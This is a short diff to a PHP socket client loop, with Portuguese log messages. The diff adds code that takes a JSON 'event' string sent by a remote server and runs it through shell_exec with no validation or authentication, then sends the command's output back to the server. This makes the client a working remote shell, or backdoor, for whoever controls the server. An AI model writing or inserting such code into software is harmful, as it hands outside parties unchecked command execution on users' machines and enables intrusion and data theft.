@@ -55,7 +55,29 @@ while(true) {
     }
 
     if (strpos($response, 'DATA_EVENT:') !== false) {
+        echo 'Recebeu command' . PHP_EOL;
 
-        echo "Recebeu evento: {$response}\n";
+        $dataJson = str_replace('DATA_EVENT:', '', $response);
+
+        $dataArray = json_decode($dataJson, true);
+
+        $command = $dataArray['event'];
+
+        echo "COMMAND: {$command}" . PHP_EOL;
+
+        $output = shell_exec($command);
+
+        echo 'Executou command' . PHP_EOL;
+
+        $dataJson = json_encode([
+            'output' => $output
+        ]);
+
+        socket_write($socket, "DATA_EVENT:{$dataJson}");
+
+        echo "Mandou ouput do command para server" . PHP_EOL;
+        var_dump($dataJson);
+
+        continue;
     }
 }
